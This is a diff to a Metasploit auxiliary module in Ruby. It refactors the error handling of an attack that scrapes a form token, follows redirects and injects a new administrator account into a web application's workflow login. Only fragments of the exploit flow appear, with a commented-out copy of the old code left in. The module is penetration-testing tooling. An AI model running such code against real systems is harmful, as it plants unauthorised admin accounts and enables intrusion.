@@ -80,12 +80,18 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     body = res.body
-    if body =~ /name="FCWEB\.FORM\.TOKEN" value="([^"]+)"/
-      token_value = ::Regexp.last_match(1)
-      print_status("FCWEB.FORM.TOKEN value: #{token_value}")
-    else
+    unless body =~ /name="FCWEB\.FORM\.TOKEN" value="([^"]+)"/
       fail_with(Failure::UnexpectedReply, 'FCWEB.FORM.TOKEN not found.')
     end
+
+    token_value = ::Regexp.last_match(1)
+    print_status("FCWEB.FORM.TOKEN value: #{token_value}")
+    # if body =~ /name="FCWEB\.FORM\.TOKEN" value="([^"]+)"/
+    #  token_value = ::Regexp.last_match(1)
+    #  print_status("FCWEB.FORM.TOKEN value: #{token_value}")
+    # else
+    #  fail_with(Failure::UnexpectedReply, 'FCWEB.FORM.TOKEN not found.')
+    # end
 
     res = send_request_cgi(
       'method' => 'GET',
@@ -99,12 +105,12 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
 
-    if res.headers['Location']
-      location_value = res.headers['Location']
-      print_status("Redirect #1: #{location_value}")
-    else
+    unless res.headers['Location']
       fail_with(Failure::UnexpectedReply, 'Location header not found.')
     end
+
+    location_value = res.headers['Location']
+    print_status("Redirect #1: #{location_value}")
 
     res = send_request_cgi(
       'method' => 'GET',
@@ -118,12 +124,12 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'Failed to receive a reply from the server.')
     end
 
-    if res.headers['Location']
-      location_value = res.headers['Location']
-      print_status("Redirect #2: #{location_value}")
-    else
+    unless res.headers['Location']
       fail_with(Failure::UnexpectedReply, 'Location header not found.')
     end
+
+    location_value = res.headers['Location']
+    print_status("Redirect #2: #{location_value}")
 
     res = send_request_cgi(
       'method' => 'GET',
@@ -140,16 +146,16 @@ class MetasploitModule < Msf::Auxiliary
     html = res.get_html_document
     h2_tag = html.at_css('h2')
 
-    if h2_tag
-      h2_text = h2_tag.text.strip
-      if h2_text == 'Choose an Order Type'
-        print_status('Received expected response.')
-      else
-        fail_with(Failure::UnexpectedReply, 'Unexpected string found inside h2 tag: ' + h2_text)
-      end
-    else
+    unless h2_tag
       fail_with(Failure::UnexpectedReply, 'h2 tag not found.')
     end
+
+    h2_text = h2_tag.text.strip
+    unless h2_text == 'Choose an Order Type'
+      fail_with(Failure::UnexpectedReply, 'Unexpected string found inside h2 tag: ' + h2_text)
+    end
+
+    print_status('Received expected response.')
 
     t = Time.now
     username = datastore['NEW_USERNAME']
@@ -251,17 +257,16 @@ class MetasploitModule < Msf::Auxiliary
     html = res.get_html_document
     title_block = html.at_css('.titleBlock')
 
-    if title_block
-      title_text = title_block.text.strip
-      if title_text.include?('Administration')
-        store_valid_credential(user: datastore['NEW_USERNAME'], private: datastore['NEW_PASSWORD'], proof: html)
-        print_good('Login successful!')
-      else
-        fail_with(Failure::UnexpectedReply, 'Expected string "Administration" not found.')
-      end
-    else
+    unless title_block
       fail_with(Failure::UnexpectedReply, 'Expected titleBlock not found.')
     end
+    title_text = title_block.text.strip
+
+    unless title_text.include?('Administration')
+      fail_with(Failure::UnexpectedReply, 'Expected string "Administration" not found.')
+    end
+    store_valid_credential(user: datastore['NEW_USERNAME'], private: datastore['NEW_PASSWORD'], proof: html)
+    print_good('Login successful!')
 
     print_good("New admin user was successfully injected:\n\t#{datastore['NEW_USERNAME']}:#{datastore['NEW_PASSWORD']}")
     print_good("Login at: #{full_uri(normalize_uri(target_uri, 'workflow/jsp/logon.jsp'))}")
